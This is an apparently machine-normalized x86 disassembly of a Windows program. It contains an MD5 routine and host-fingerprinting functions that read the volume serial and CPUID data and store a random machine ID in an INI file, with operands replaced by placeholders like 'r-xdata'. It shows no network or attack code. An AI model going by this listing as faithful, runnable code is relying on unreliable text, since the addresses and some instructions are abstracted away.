lea edi [ edx + edi - 0x70f3336e ]
mov edx edi
shl edi 0xa
mov ebx [ esp + 0x38 ]
shr edx 0x16
or edx edi
add edx eax
mov edi ecx
not edi
or edi edx
xor edi eax
add edi ebx
lea edi [ esi + edi - 0x100b83 ]
mov ebx [ esp + 0x14 ]
mov esi edi
shl edi 0xf
shr esi 0x11
or esi edi
mov edi eax
not edi
add esi edx
or edi esi
xor edi edx
add edi ebx
mov ebx [ esp + 0x30 ]
lea edi [ ecx + edi - 0x7a7ba22f ]
mov ecx edi
shr edi 0xb
shl ecx 0x15
or ecx edi
mov edi edx
not edi
add ecx esi
or edi ecx
xor edi esi
add edi ebx
lea edi [ eax + edi + 0x6fa87e4f ]
mov eax edi
shl edi 0x6
shr eax 0x1a
or eax edi
mov edi esi
add eax ecx
not edi
or edi eax
xor edi ecx
add edi ebp
lea edi [ edx + edi - 0x1d31920 ]
mov edx edi
shl edi 0xa
mov ebp [ esp + 0x28 ]
shr edx 0x16
or edx edi
add edx eax
mov edi ecx
not edi
or edi edx
xor edi eax
add edi ebp
lea edi [ esi + edi - 0x5cfebcec ]
mov esi edi
shl edi 0xf
mov ebp [ esp + 0x44 ]
shr esi 0x11
or esi edi
add esi edx
mov edi eax
not edi
or edi esi
xor edi edx
add edi ebp
lea edi [ ecx + edi + 0x4e0811a1 ]
mov ecx edi
shr edi 0xb
mov ebp [ esp + 0x20 ]
shl ecx 0x15
or ecx edi
add ecx esi
mov edi edx
not edi
or edi ecx
xor edi esi
add edi ebp
lea edi [ eax + edi - 0x8ac817e ]
mov ebp [ esp + 0x3c ]
mov eax edi
shl edi 0x6
shr eax 0x1a
or eax edi
mov edi esi
not edi
add eax ecx
or edi eax
xor edi ecx
add edi ebp
mov ebp [ esp + 0x18 ]
lea edi [ edx + edi - 0x42c50dcb ]
mov edx edi
shl edi 0xa
mov ebx [ esp + 0x34 ]
shr edx 0x16
or edx edi
add edx eax
mov edi ecx
not edi
or edi edx
xor edi eax
add edi ebp
lea esi [ esi + edi + 0x2ad7d2bb ]
mov edi esi
shl esi 0xf
shr edi 0x11
or edi esi
mov esi eax
not esi
add edi edx
or esi edi
xor esi edx
add esi ebx
lea ecx [ ecx + esi - 0x14792c6f ]
mov esi [ esp + 0x54 ]
mov ebx [ esi ]
add eax ebx
mov [ esi ] eax
mov eax ecx
mov ebx [ esi + 0x4 ]
shl eax 0x15
shr ecx 0xb
or eax ecx
add eax ebx
add eax edi
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
add eax edi
mov [ esi + 0x8 ] eax
mov eax [ esi + 0xc ]
pop edi
add eax edx
mov [ esi + 0xc ] eax
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0x8
sub_41e010
push ebx
mov ebx ecx
mov edx [ ebx + 0x10 ]
mov ecx [ esp + 0xc ]
mov eax edx
push esi
shr eax 0x3
lea edx [ edx + ecx * 8 ]
lea esi [ ecx * 8 ]
and eax 0x3f
cmp edx esi
push edi
mov [ ebx + 0x10 ] edx
jae r-xdata
mov edi [ ebx + 0x14 ]
mov edx ecx
shr edx 0x1d
push ebp
add edi edx
mov ebp 0x40
mov [ ebx + 0x14 ] edi
sub ebp eax
xor edi edi
cmp ecx ebp
jb r-xdata
inc [ ebx + 0x14 ]
sub ecx edi
pop ebp
je r-xdata
mov esi [ esp + 0x14 ]
lea edi [ eax + ebx + 0x18 ]
mov ecx ebp
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebx + 0x18 ]
push ecx
push ebx
mov ecx ebx
call sub_41d720
lea esi [ ebp + 0x3f ]
mov edi ebp
mov ebp [ esp + 0x18 ]
cmp esi ebp
jae r-xdata
pop edi
pop esi
pop ebx
retn 0x8
mov edx [ esp + 0x10 ]
lea esi [ edi + edx ]
lea edi [ eax + ebx + 0x18 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x18 ]
xor eax eax
mov edx [ esp + 0x14 ]
lea eax [ edx + esi - 0x3f ]
push eax
push ebx
mov ecx ebx
call sub_41d720
add esi 0x40
add edi 0x40
cmp esi ebp
jb r-xdata
sub_41e0d0
sub esp 0xc
mov eax [ rw-data ]
push esi
mov esi ecx
mov [ esp + 0xc ] eax
push edi
xor ecx ecx
lea eax [ esi + 0x12 ]
mov dl [ eax - 0x2 ]
mov [ esp + ecx + 0x8 ] dl
mov dl [ eax - 0x1 ]
mov [ esp + ecx + 0x9 ] dl
mov dl [ eax ]
mov [ esp + ecx + 0xa ] dl
mov dl [ eax + 0x1 ]
mov [ esp + ecx + 0xb ] dl
add ecx 0x4
add eax 0x4
cmp ecx 0x8
jb r-xdata
mov ecx [ esi + 0x10 ]
shr ecx 0x3
and ecx 0x3f
cmp ecx 0x38
mov eax 0x38
jb r-xdata
sub eax ecx
push eax
push rw-data
mov ecx esi
call sub_41e010
push 0x8
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_41e010
mov ecx [ esp + 0x18 ]
inc ecx
lea eax [ esi + 0x2 ]
mov edi 0x4
lea ecx [ ecx ]
mov eax 0x78
mov dl [ eax - 0x2 ]
mov [ ecx - 0x1 ] dl
mov dl [ eax - 0x1 ]
mov [ ecx ] dl
mov dl [ eax ]
mov [ ecx + 0x1 ] dl
mov dl [ eax + 0x1 ]
mov [ ecx + 0x2 ] dl
add eax 0x4
add ecx 0x4
dec edi
jne r-xdata
xor eax eax
lea edi [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
mov [ esi ] 0x67452301
mov [ esi + 0x4 ] 0xefcdab89
mov [ esi + 0x8 ] 0x98badcfe
mov [ esi + 0xc ] 0x10325476
mov ecx 0x10
[ edi ]
mov ecx [ esp + 0x10 ]
pop edi
pop esi
call sub_42e72f
add esp 0xc
retn 0x4
sub_41e1d0
push 0xffffffff
push sub_431ef1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0x1
lea ecx [ esi + 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_41e230
sub esp 0x70
mov eax [ rw-data ]
push esi
mov esi [ esp + 0x78 ]
push r--data
mov ecx esi
mov [ esp + 0x74 ] eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x88 ]
push eax
push 0x64
lea ecx [ esp + 0x24 ]
push ecx
push r--data
call [ GetVolumeInformationA@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x78 ]
push 0x6
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] 0x0
mov [ esp + 0x11 ] 0x0
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
mov ecx [ esp + 0x70 ]
mov al 0x1
pop esi
call sub_42e72f
add esp 0x70
retn 0x4
xor al al
pop esi
mov ecx [ esp + 0x6c ]
call sub_42e72f
add esp 0x70
retn 0x4
sub_41e2c0
push 0xffffffff
push sub_431f1a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] 0x0
mov eax [ esp + 0x18 ]
cmp eax 0xb63f
jb r-xdata
xor edx edx
mov [ esp + 0x19 ] dx
mov ecx 0x24
mov [ esp + 0x1b ] dl
div ecx
cmp edx 0xa
jae r-xdata
xor edx edx
mov ecx 0xb63f
div ecx
mov eax edx
add dl 0x37
add dl 0x30
jmp r-xdata
add dl 0x37
add dl 0x30
jmp r-xdata
mov [ esp + 0x18 ] dl
xor edx edx
mov ecx 0x24
div ecx
cmp edx 0xa
jae r-xdata
add dl 0x37
add dl 0x30
jmp r-xdata
mov [ esp + 0x19 ] dl
xor edx edx
mov ecx 0x24
div ecx
cmp edx 0xa
jae r-xdata
push esi
mov esi [ esp + 0x18 ]
mov [ esp + 0x1e ] dl
lea edx [ esp + 0x1c ]
push edx
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x8
sub_41e380
push 0xffffffff
push sub_431f4a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
mov [ esp + 0x8 ] 0x0
xor ebx ebx
push esi
mov [ esp + 0x8 ] bl
mov [ esp + 0x9 ] bl
call sub_420540
mov ecx eax
call sub_420680
test eax eax
jbe r-xdata
add bl 0x31
jmp r-xdata
lea esp [ esp ]
mov esi [ esp + 0x20 ]
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov [ esp + 0xc ] bl
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x10 ]
mov eax esi
pop esi
mov [ esp + 0x8 ] 0x1
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x4
shr eax 0x1
inc ebx
test eax eax
ja r-xdata
cmp ebx 0x6
jae r-xdata
cmp ebx 0x8
jae r-xdata
add bl 0x39
add bl 0x32
jmp r-xdata
sub_41e410
push ebx
push esi
push edi
call [ GetTickCount@IAT ]
mov esi [ srand@IAT ]
push eax
call esi
mov edi [ rand@IAT ]
call edi
push 0x0
mov ebx eax
call [ time@IAT ]
push eax
call esi
add esp 0xc
call edi
pop edi
pop esi
add eax ebx
pop ebx
retn
sub_41e450
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c4
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edx edx
mov [ ebp - 0x1d0 ] dl
mov ecx 0x31
xor eax eax
lea edi [ ebp - 0x1cf ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov [ ebp - 0x108 ] dl
mov ecx 0x31
xor eax eax
lea edi [ ebp - 0x107 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov [ ebp - 0x40 ] dl
xor eax eax
mov [ ebp - 0x3f ] eax
mov [ ebp - 0x3b ] eax
mov [ ebp - 0x37 ] eax
mov [ ebp - 0x33 ] eax
mov [ ebp - 0x2f ] ax
mov [ ebp - 0x2d ] al
xor esi esi
mov [ ebp - 0x2c ] dl
xor ecx ecx
mov [ ebp - 0x2b ] ecx
mov [ ebp - 0x27 ] ecx
mov [ ebp - 0x23 ] ecx
mov [ ebp - 0x1f ] cx
mov [ ebp - 0x1d ] cl
mov [ ebp - 0x1d4 ] edx
mov [ ebp - 0x4 ] edx
mov eax 0x0
cpuid
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x1d4 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
jne r-xdata
lea eax [ ebp - 0x40 ]
push eax
lea ecx [ ebp - 0x108 ]
push ecx
push r--data
lea edx [ ebp - 0x1d0 ]
push edx
call [ sprintf@IAT ]
add esp 0x10
lea eax [ ebp - 0x1d0 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
mov al 0x1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
mov ecx [ ebp - 0x1c ]
call sub_42e72f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x1d4 ]
push edx
push r--data
lea eax [ ebp - 0x40 ]
push eax
call [ sprintf@IAT ]
add esp 0xc
lea eax [ ebp - 0x2c ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp eax 0xbe
jb r-xdata
mov ecx eax
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x108 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax 0xbe
sub_41e5c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x8c
mov eax [ rw-data ]
push ebx
push esi
mov [ esp + 0x90 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ eax ]
push edi
add ebx 0xec71
mov ecx 0x1f
mov esi ebx
lea edi [ esp + 0x10 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
movsb [ edi ] [ esi ]
push ecx
mov [ esp + 0x93 ] 0x0
call [ lstrlenA@IAT ]
test eax eax
jle r-xdata
mov ecx [ esp + 0x94 ]
xor eax eax
call sub_42e72f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0x80
jge r-xdata
mov dl [ esp + 0x12 ]
mov cl 0x2f
cmp dl cl
jne r-xdata
cmp [ esp + 0x15 ] cl
jne r-xdata
mov cl [ esp + 0x10 ]
test cl cl
lea edx [ esp + 0x10 ]
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx ] ebx
mov ecx [ esp + 0x94 ]
call sub_42e72f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp cl 0x20
jb r-xdata
cmp [ edx ] 0x0
jne r-xdata
cmp cl 0x7f
jae r-xdata
mov cl [ edx + 0x1 ]
inc edx
test cl cl
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx ] ebx
mov ecx [ esp + 0x94 ]
call sub_42e72f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e690
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x8c
mov eax [ rw-data ]
push ebx
push esi
mov [ esp + 0x90 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ eax ]
push edi
add ebx 0xf478
mov ecx 0x1f
mov esi ebx
lea edi [ esp + 0x10 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
movsb [ edi ] [ esi ]
push ecx
mov [ esp + 0x93 ] 0x0
call [ lstrlenA@IAT ]
test eax eax
jle r-xdata
mov ecx [ esp + 0x94 ]
xor eax eax
call sub_42e72f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0x80
jge r-xdata
mov dl [ esp + 0x12 ]
mov cl 0x2d
cmp dl cl
jne r-xdata
cmp [ esp + 0x17 ] cl
jne r-xdata
mov cl [ esp + 0x10 ]
test cl cl
lea edx [ esp + 0x10 ]
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx ] ebx
mov ecx [ esp + 0x94 ]
call sub_42e72f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp cl 0x20
jb r-xdata
cmp [ edx ] 0x0
jne r-xdata
cmp cl 0x7f
jae r-xdata
mov cl [ edx + 0x1 ]
inc edx
test cl cl
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx ] ebx
mov ecx [ esp + 0x94 ]
call sub_42e72f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e760
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x9c
mov eax [ rw-data ]
push ebx
push esi
mov [ esp + 0xa0 ] eax
push edi
mov [ esp + 0x14 ] 0x6577
mov [ esp + 0x18 ] 0x7196
mov [ esp + 0x1c ] 0x7550
mov [ esp + 0x10 ] 0x0
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov ebx [ esp + eax * 4 + 0x14 ]
add ebx edx
mov ecx 0x1f
mov esi ebx
lea edi [ esp + 0x20 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea edx [ esp + 0x20 ]
movsb [ edi ] [ esi ]
push edx
mov [ esp + 0xa3 ] 0x0
call [ lstrlenA@IAT ]
mov esi eax
test esi esi
jle r-xdata
mov eax [ esp + 0x10 ]
inc eax
cmp eax 0x3
mov [ esp + 0x10 ] eax
jb r-xdata
cmp esi 0x80
jge r-xdata
mov ecx [ esp + 0xa4 ]
xor eax eax
call sub_42e72f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esp + 0x27 ] 0x2e
jne r-xdata
cmp [ esp + 0x2b ] 0x2e
jne r-xdata
mov cl [ esp + 0x20 ]
test cl cl
lea edx [ esp + 0x20 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
mov eax esi
mov ecx [ esp + 0xa4 ]
call sub_42e72f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ebx [ ebx ]
cmp [ edx ] 0x0
je r-xdata
cmp cl 0x7f
jae r-xdata
mov cl [ edx + 0x1 ]
inc edx
test cl cl
jne r-xdata
cmp cl 0x20
jb r-xdata
sub_41e860
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ecx + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
xor ecx ecx
test eax eax
sete cl
mov al cl
retn
xor ecx ecx
test eax eax
sete cl
mov al cl
retn
sub_41e8f0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn
push ebx
mov ebx [ esp + 0x18 ]
push ebx
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
add esi 0x1c
cmp esi edi
jne r-xdata
pop ebx
sub_41e920
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x10 ]
cmp ebx esi
je r-xdata
mov eax [ esp + 0x14 ]
pop esi
pop ebx
retn
push edi
mov edi [ esp + 0x18 ]
sub esi 0x1c
sub edi 0x1c
push esi
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
cmp esi ebx
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_41e980
push 0xffffffff
push sub_431fb0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x980
mov eax [ rw-data ]
push esi
push edi
mov [ esp + 0xc ] ecx
mov [ esp + 0x984 ] eax
xor eax eax
mov [ esp + 0x8 ] 0x0
mov ecx 0x41
lea edi [ esp + 0x80 ]
[ edi ]
push r--data
lea ecx [ esp + 0x68 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x990 ] 0x1
push 0x104
lea eax [ esp + 0x84 ]
push eax
call [ GetSystemDirectoryA@IAT ]
test eax eax
je r-xdata
mov esi [ esp + 0x998 ]
lea eax [ esp + 0x64 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x8 ] 0x1
mov [ esp + 0x990 ] 0x0
lea ecx [ esp + 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x988 ]
mov eax esi
pop edi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x980 ]
pop esi
call sub_42e72f
add esp 0x98c
retn 0x4
lea ecx [ esp + 0x80 ]
push ecx
lea ecx [ esp + 0x4c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x990 ] 0x2
push r--data
lea ecx [ esp + 0x4c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
mov [ esp + 0x184 ] 0x0
xor eax eax
mov ecx 0x1ff
lea edi [ esp + 0x185 ]
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x48 ]
stosb [ edi ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x800
lea edx [ esp + 0x18c ]
push edx
push r--data
push r--data
push r--data
call [ GetPrivateProfileStringA@IAT ]
test eax eax
je r-xdata
mov [ esp + 0x990 ] 0x1
lea ecx [ esp + 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push ebx
lea eax [ esp + 0x188 ]
push eax
lea ecx [ esp + 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x994 ] 0x3
mov ebx [ ??$?8DU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBD@Z@IAT ]
lea ecx [ esp + 0x30 ]
push r--data
push ecx
call ebx
add esp 0x8
test al al
je r-xdata
lea edx [ esp + 0x30 ]
push edx
mov edi [ srand@IAT ]
push ebp
mov ebp [ rand@IAT ]
call [ GetTickCount@IAT ]
push eax
call edi
call ebp
push 0x0
mov esi eax
call [ time@IAT ]
push eax
call edi
add esp 0xc
call ebp
mov ecx [ esp + 0x14 ]
add eax esi
push eax
lea edx [ esp + 0x1c ]
push edx
call sub_41e2c0
mov [ esp + 0x998 ] 0x4
push eax
lea ecx [ esp + 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov [ esp + 0x998 ] 0x3
lea ecx [ esp + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ esp + 0x34 ]
push r--data
push eax
call ebx
add esp 0x8
test al al
jne r-xdata
lea ecx [ esp + 0x50 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ esp + 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push r--data
push r--data
call [ WritePrivateProfileStringA@IAT ]
test eax eax
pop ebp
je r-xdata
mov [ esp + 0x994 ] 0x2
lea ecx [ esp + 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop ebx
lea ecx [ esp + 0x30 ]
push ecx
jmp r-xdata
lea ecx [ esp + 0x6c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
sub_41ebe0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x154
mov eax [ rw-data ]
push ebx
mov [ esp + 0x154 ] eax
push esi
push edi
xor ebx ebx
xor eax eax
mov [ esp + 0x90 ] bl
mov ecx 0x31
lea edi [ esp + 0x91 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0xb
mov esi r--data
lea edi [ esp + 0x54 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
mov [ esp + 0x82 ] eax
mov [ esp + 0x86 ] eax
mov [ esp + 0x8a ] eax
lea ecx [ esp + 0x54 ]
lea edx [ esp + 0x1c ]
push r--data
mov [ esp + 0x34 ] 0xf0000
mov [ esp + 0x38 ] ebx
mov [ esp + 0x28 ] 0xffff
mov [ esp + 0x92 ] ax
mov [ esp + 0x18 ] ebx
mov [ esp + 0x24 ] ecx
mov [ esp + 0x20 ] 0x2c
mov [ esp + 0x22 ] 0x2e
mov [ esp + 0x4c ] 0x40
mov [ esp + 0x40 ] 0x18
mov [ esp + 0x48 ] edx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x54 ] ebx
call [ LoadLibraryW@IAT ]
mov edi [ GetProcAddress@IAT ]
mov esi eax
push r--data
push esi
call edi
push r--data
push esi
mov [ esp + 0x18 ] eax
call edi
push r--data
push esi
mov [ esp + 0x30 ] eax
call edi
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x3c ]
push eax
push 0x4
lea ecx [ esp + 0x34 ]
push ecx
call [ esp + 0x1c ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x90 ]
push ecx
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
mov ecx [ esp + 0x15c ]
mov al 0x1
call sub_42e72f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x2
push ebx
push 0x1
lea edx [ esp + 0x30 ]
push edx
mov edx [ esp + 0x3c ]
lea eax [ esp + 0x40 ]
push eax
push 0xffff
push ebx
lea ecx [ esp + 0x30 ]
push ecx
push 0xffffffff
push edx
call [ esp + 0x50 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
lea ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x14 ] eax
call sub_41e5c0
add esp 0x4
cmp eax ebx
jne r-xdata
cmp eax 0xc7
jb r-xdata
lea edx [ esp + 0x10 ]
push edx
call sub_41e690
add esp 0x4
cmp eax ebx
jne r-xdata
mov esi [ esp + 0x10 ]
mov ecx eax
mov edx ecx
shr ecx 0x2
lea edi [ esp + 0x90 ]
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax 0xc7
lea eax [ esp + 0x10 ]
push eax
call sub_41e760
add esp 0x4
cmp eax ebx
je r-xdata
mov eax [ esp + 0x14 ]
push eax
push 0xffffffff
call [ esp + 0x20 ]
sub_41ee30
push 0xffffffff
push sub_431fc8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push rw-data
mov [ esp + 0x4 ] rw-data
call [ EnterCriticalSection@IAT ]
mov [ esp + 0xc ] 0x0
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov [ esp + 0xc ] 0xffffffff
push rw-data
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push esi
mov esi ecx
call sub_41e1d0
push esi
call ??3@YAXPAX@Z
add esp 0x4
mov [ rw-data ] 0x0
pop esi
sub_41eeb0
push 0xffffffff
push sub_431ff2
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x3c
mov eax [ rw-data ]
push ebx
push esi
push edi
mov edi [ esp + 0x5c ]
mov [ esp + 0x44 ] eax
mov eax [ edi + 0x4 ]
xor esi esi
cmp eax esi
je r-xdata
mov eax [ esp + 0x58 ]
mov bl [ eax ]
cmp bl 0x44
jne r-xdata
mov ecx [ edi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ esp + 0x5c ] eax
jne r-xdata
mov cl 0xff
cmp bl cl
jne r-xdata
cmp [ eax + 0x1 ] 0x45
jne r-xdata
push ebp
lea ecx [ esp + 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x54 ] esi
mov ebp [ esp + 0x5c ]
nop
test bl bl
jne r-xdata
cmp [ eax + 0x1 ] cl
jne r-xdata
cmp [ eax + 0x2 ] 0x53
jne r-xdata
xor ecx ecx
mov cl [ esi + ebp ]
lea edx [ esp + 0x10 ]
push ecx
push edx
call sub_429290
add esp 0x8
mov [ esp + 0x54 ] 0x1
push eax
lea ecx [ esp + 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
mov [ esp + 0x54 ] 0x0
lea ecx [ esp + 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
inc esi
cmp esi 0x6
jb r-xdata
lea ecx [ esp + 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
xor ebp ebp
mov ebx eax
mov [ esp + 0x5c ] ebp
lea ebx [ ebx ]
cmp bl 0x2
jne r-xdata
mov cl [ eax + 0x1 ]
test cl cl
jne r-xdata
cmp [ eax + 0x2 ] cl
jne r-xdata
cmp [ eax + 0x3 ] 0x54
je r-xdata
mov [ esp + 0x54 ] 0xffffffff
lea ecx [ esp + 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al 0x1
mov ecx [ edi + 0x8 ]
sub ecx eax
mov eax 0x92492493
